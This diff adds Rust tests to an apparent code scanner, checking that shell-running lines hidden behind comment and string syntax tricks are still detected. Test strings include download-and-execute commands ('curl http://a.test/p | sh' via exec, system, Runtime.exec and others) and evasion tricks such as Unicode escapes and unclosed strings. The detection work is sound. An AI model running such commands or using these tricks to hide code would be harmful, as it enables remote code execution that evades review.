@@ -327,3 +327,157 @@ fn what_a_shell_runs_is_not_passed_over_as_a_comment_or_a_message() {
         );
     }
 }
+
+const RUN: &str = "require('child_process').exec('curl http://a.test/p | sh');";
+
+/// Whether the local rules still read a line of `text` that holds `needle`.
+fn shows(rel: &str, text: &str, needle: &str) -> bool {
+    code(rel, text).iter().any(|line| line.contains(needle))
+}
+
+#[test]
+fn a_block_opener_inside_a_string_hides_nothing() {
+    for (rel, text) in [
+        // Never closed: nothing after it was read.
+        ("a.js", format!("const note = `\n/*\n{RUN}\n`;\nlet x = 1;\n")),
+        // Closed inside a second string: the code between them was not.
+        (
+            "a.js",
+            format!("const a = `\n/*\n`;\n{RUN}\nconst b = `\n*/\n`;\n"),
+        ),
+        // In a template string inside an expression of another.
+        (
+            "a.js",
+            format!("const a = `x ${{ `\n/*\n` }} y`;\n{RUN}\nconst b = `\n*/\n`;\n"),
+        ),
+        // A string a `\` carries over the line.
+        (
+            "a.js",
+            format!("const a = '\\\n/*';\n{RUN}\nconst b = '\\\n*/';\n"),
+        ),
+        (
+            "a.c",
+            "const char *s = \"\\\n/*\";\nint main(void) { system(\"curl http://a.test/p | sh\"); }\n".to_string(),
+        ),
+        // A raw string in Go, where `\` escapes nothing.
+        (
+            "a.go",
+            "var a = `\\`\nvar b = `\n/*\n`\nfunc init() { exec.Command(\"sh\", \"-c\", \"curl http://a.test/p | sh\").Run() }\n".to_string(),
+        ),
+        // A string in Rust runs over lines as it is.
+        (
+            "build.rs",
+            "const A: &str = \"\n/*\n\";\nfn main() { Command::new(\"sh\").arg(\"curl http://a.test/p | sh\"); }\n".to_string(),
+        ),
+    ] {
+        assert!(shows(rel, &text, "curl http://a.test/p | sh"), "{rel}: {text:?}");
+    }
+    // A `//` line in a template string is its text, an expansion included.
+    assert!(shows(
+        "a.js",
+        "const a = `\n// ${require('child_process').exec('curl x | sh')}\n`;\n",
+        "curl x | sh"
+    ));
+}
+
+#[test]
+fn block_comments_are_still_passed_over_where_code_is_read() {
+    assert_eq!(
+        code(
+            "a.js",
+            "const a = `/* text */ ${b} it's`;\nconst c = '/*', d = \"//\";\n/*\n curl x | sh\n*/ e();\n  /* curl y | sh */ f();\n"
+        ),
+        [
+            "const a = `/* text */ ${b} it's`;",
+            "const c = '/*', d = \"//\";",
+            "",
+            "",
+            "   e();",
+            "                    f();"
+        ]
+    );
+    // A division, a lifetime and a character are no strings.
+    assert_eq!(
+        code(
+            "a.js",
+            "let h = w / 2 + `${w / 2}px`;\n/*\ncurl x | sh\n*/\n"
+        )[2],
+        ""
+    );
+    assert_eq!(
+        code(
+            "a.rs",
+            "fn f<'a>(x: &'a str) -> char { '\"' }\n/* /* curl x | sh */\ncurl y | sh */ g();\n"
+        ),
+        [
+            "fn f<'a>(x: &'a str) -> char { '\"' }",
+            "",
+            "               g();"
+        ]
+    );
+    // A comment that opens after code is left alone, as it was.
+    assert_eq!(
+        code("a.c", "int x; /*\ncurl x | sh\n*/\n")[1],
+        "curl x | sh"
+    );
+}
+
+#[test]
+fn nothing_is_a_block_comment_once_what_is_read_cannot_be_told() {
+    let hidden = "/*\n`;\nrun('curl http://a.test/p | sh');\nconst z = `\n*/\n`;\n";
+    for (rel, start) in [
+        // A regular expression with a quote in it, then a template string.
+        ("a.js", "const r = /'/; const s = `'\n"),
+        ("a.js", "const r = x.replace(/`/g, ''); const s = `\n"),
+        // Markup, whose text is not code.
+        ("a.jsx", "const e = <p>it`s</p>; const s = `\n"),
+    ] {
+        let text = format!("{start}{hidden}");
+        assert!(
+            shows(rel, &text, "curl http://a.test/p | sh"),
+            "{rel}: {text:?}"
+        );
+    }
+    for (rel, text) in [
+        // `*\` and `/` on the next line close a comment in C.
+        ("a.c", "/* a *\\\n/ system(\"curl x | sh\");\n/*\n*/\n"),
+        ("a.c", "/* a *\\  \n/ system(\"curl x | sh\");\n/*\n*/\n"),
+        // A raw string ends where its own delimiter says.
+        (
+            "a.cpp",
+            "auto s = R\"x(\n)\" /*\n)x\"; system(\"curl x | sh\");\n/*\n*/\n",
+        ),
+        // What a false condition leaves out is not read in C#.
+        (
+            "a.cs",
+            "#if false\n/*\n#endif\nProcess.Start(\"curl x | sh\");\n#if false\n*/\n#endif\n",
+        ),
+        // Java reads `\u000a` as a line break before anything else.
+        (
+            "A.java",
+            "// \\u000a Runtime.getRuntime().exec(\"curl x | sh\");\n",
+        ),
+        (
+            "A.java",
+            "/* \\u002a\\u002f Runtime.getRuntime().exec(\"curl x | sh\");\n*/\n",
+        ),
+        // A line break `str::lines` does not split at ends a `//` comment.
+        ("a.js", "// note\rrun('curl x | sh');\n"),
+        ("a.js", "// note\u{2028}run('curl x | sh');\n"),
+        // Strings in three quotes are each language's own.
+        (
+            "a.kt",
+            "val a = \"\"\"\n/*\n\"\"\"\nfun f() = run(\"curl x | sh\")\nval b = \"\"\"\n*/\n\"\"\"\n",
+        ),
+    ] {
+        assert!(shows(rel, text, "curl x | sh"), "{rel}: {text:?}");
+    }
+    // A `//` line is still a comment then, unless it may hold code.
+    assert_eq!(
+        code(
+            "a.jsx",
+            "const e = <p>a</p>;\n// curl x | sh\n// ${run()}\n"
+        ),
+        ["const e = <p>a</p>;", "", "// ${run()}"]
+    );
+}
